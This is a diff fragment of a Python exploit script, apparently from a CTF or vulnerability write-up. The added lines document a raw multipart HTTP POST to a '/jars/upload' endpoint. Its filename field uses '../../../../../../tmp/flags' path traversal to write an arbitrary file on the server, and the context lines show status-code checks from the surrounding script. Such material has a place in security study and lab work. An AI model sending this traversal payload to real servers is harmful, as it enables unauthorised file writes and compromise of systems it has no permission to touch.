@@ -239,6 +239,26 @@ if req.status_code == 400:
 
     if req_1.status_code == 200:
         print  "hahahaha"
+        
+        
+# name:jarfile
+# filename:../../../../../../tmp/flags
+#文件内容：mdfive
+↓        ↓        ↓        ↓        ↓
+# POST /jars/upload HTTP/1.1
+# Connection: close
+# Accept-Encoding: gzip, deflate
+# Accept: */*
+# User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
+# Host: IP:PORT
+# Content-Type: multipart/form-data; boundary=------16403e4608fad6cc1cd8321b8b7d7f22
+# Content-Length: 181
+
+# --16403e4608fad6cc1cd8321b8b7d7f22
+# Content-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/flags"
+# 
+# Hello Requests.
+# --16403e4608fad6cc1cd8321b8b7d7f22--
 ```
 
 
